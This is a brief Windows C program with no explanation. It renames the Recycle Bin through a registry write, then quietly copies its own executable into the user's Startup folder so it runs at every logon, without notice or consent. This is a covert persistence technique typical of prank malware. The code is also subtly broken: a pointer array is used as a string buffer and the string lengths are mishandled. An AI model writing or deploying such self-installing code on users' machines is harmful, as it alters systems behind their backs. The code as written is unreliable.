#include <Windows.h>
#include <Shlobj.h>
#include <string.h>
#include <stdio.h>

int main(int argc, char* argv[]){
    HKEY recycleBinHKey;
    LPCSTR registrySubkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}";
    const BYTE * pnewValue = (const BYTE *) "NewName";

    RegOpenKeyExA(HKEY_CURRENT_USER, registrySubkey, 0, KEY_SET_VALUE, &recycleBinHKey);
    RegSetValueExA(recycleBinHKey, NULL, 0, REG_SZ, pnewValue, strlen(pnewValue));
    RegCloseKey(recycleBinHKey);

    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_FLUSHNOWAIT, NULL, NULL);

    const char* command[340];
    sprintf(command, "copy \"%s\" \"%%USERPROFILE%%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", argv[0]);
    system(command);
    return 0;
}
